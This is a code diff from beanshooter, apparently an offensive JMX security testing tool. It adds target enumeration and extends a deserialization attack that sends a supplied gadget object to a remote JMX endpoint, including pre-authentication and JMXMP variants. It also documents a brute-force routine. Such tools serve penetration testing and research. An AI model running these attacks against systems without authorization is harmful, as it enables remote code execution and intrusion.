@@ -1,5 +1,6 @@
 package de.qtc.beanshooter.operation;
 
+import java.io.IOException;
 import java.util.Map;
 import java.util.Set;
 
@@ -10,7 +11,9 @@ import javax.management.ReflectionException;
 import javax.management.RuntimeMBeanException;
 
 import de.qtc.beanshooter.cli.ArgumentHandler;
+import de.qtc.beanshooter.exceptions.AuthenticationException;
 import de.qtc.beanshooter.exceptions.ExceptionHandler;
+import de.qtc.beanshooter.exceptions.InvalidLoginClassException;
 import de.qtc.beanshooter.io.Logger;
 import de.qtc.beanshooter.io.WordlistHandler;
 import de.qtc.beanshooter.plugin.PluginSystem;
@@ -35,15 +38,23 @@ public class Dispatcher {
      */
     protected MBeanServerConnection getMBeanServerConnection()
     {
-        if( conn != null )
-            return conn;
+        if( conn == null )
+            conn = getMBeanServerConnection(ArgumentHandler.getEnv());
 
+        return conn;
+    }
+
+    /**
+     * Obtain an MBeanServer connection.
+     *
+     * @return MBeanServerConnection to the remote MBeanServer
+     */
+    protected MBeanServerConnection getMBeanServerConnection(Map<String,Object> env)
+    {
         String host = ArgumentHandler.require(BeanshooterOption.TARGET_HOST);
         int port = ArgumentHandler.require(BeanshooterOption.TARGET_PORT);
-        Map<String,Object> env = ArgumentHandler.getEnv();
 
-        conn = PluginSystem.getMBeanServerConnection(host, port, env);
-        return conn;
+        return PluginSystem.getMBeanServerConnection(host, port, env);
     }
 
     /**
@@ -95,7 +106,35 @@ public class Dispatcher {
 
     public void enumerate()
     {
-    };
+        boolean access = false;
+
+        String host = ArgumentHandler.require(BeanshooterOption.TARGET_HOST);
+        int port = ArgumentHandler.require(BeanshooterOption.TARGET_PORT);
+
+        EnumHelper enumHelper = new EnumHelper(host, port);
+
+        if(BeanshooterOption.CONN_JMXMP.getBool())
+        {
+            access = enumHelper.enumSASL();
+            Logger.lineBreak();
+
+            enumHelper.enumSerial();
+        }
+
+        else
+        {
+            access = enumHelper.enumAccess();
+            Logger.lineBreak();
+
+            enumHelper.enumSerial();
+        }
+
+        if (!access)
+            return;
+
+        Logger.lineBreak();
+        enumHelper.enumMBeans();
+    }
 
 
     /**
@@ -104,16 +143,27 @@ public class Dispatcher {
      */
     public void serial()
     {
-        MBeanServerClient mBeanServerClient = getMBeanServerClient();
-        Object payloadObject = ArgumentHandler.getInstance().getGadget();
-        ObjectName loggingMBean = Utils.getObjectName("java.util.logging:type=Logging");
-
         Logger.println("Attemting deserialization attack on JMX endpoint.");
         Logger.lineBreak();
         Logger.increaseIndent();
 
-        try {
-            mBeanServerClient.invoke(loggingMBean, "getLoggerLevel", payloadObject);
+        Object payloadObject = ArgumentHandler.getInstance().getGadget();
+
+        try
+        {
+            if (BeanshooterOption.CONN_JMXMP.getBool())
+                SerialHelper.serialJMXMP(payloadObject);
+
+            if (BeanshooterOption.SERIAL_PREAUTH.getBool())
+                SerialHelper.serialPreauth(payloadObject);
+
+            else
+            {
+                MBeanServerClient mBeanServerClient = getMBeanServerClient();
+                ObjectName loggingMBean = Utils.getObjectName("java.util.logging:type=Logging");
+
+                mBeanServerClient.invoke(loggingMBean, "getLoggerLevel", payloadObject);
+            }
 
         } catch ( MBeanException | ReflectionException  e) {
 
@@ -148,9 +198,40 @@ public class Dispatcher {
                 Logger.eprintlnMixedYellow("Encountered unexpected", t.getClass().getName(), "after the payload object was sent.");
 
             ExceptionHandler.showStackTrace(e);
+
+        }
+
+        catch (AuthenticationException e)
+        {
+            Throwable t = ExceptionHandler.getCause(e.getOriginalException());
+
+            if( t instanceof ClassNotFoundException)
+                ExceptionHandler.deserialClassNotFound((ClassNotFoundException)t);
+
+            else if( e instanceof InvalidLoginClassException)
+                Logger.printlnMixedRed("Server appears to be", "not vulnerable", "to preauth deserialization attacks.");
+
+            else
+                ExceptionHandler.unexpectedException(e, "deserialization", "attack", false);
+        }
+
+        catch (IOException e)
+        {
+            Throwable t = ExceptionHandler.getCause(e);
+
+            if (t instanceof ClassNotFoundException)
+                ExceptionHandler.deserialClassNotFound((ClassNotFoundException)t);
+
+            else
+                Logger.eprintlnMixedYellow("Encountered unexpected", t.getClass().getName(), "after the payload object was sent.");
+
+            ExceptionHandler.showStackTrace(e);
         }
     };
 
+    /**
+     * Performs a brureforce attack on the targeted JMX endpoint
+     */
     public void brute()
     {
         String host = ArgumentHandler.require(BeanshooterOption.TARGET_HOST);
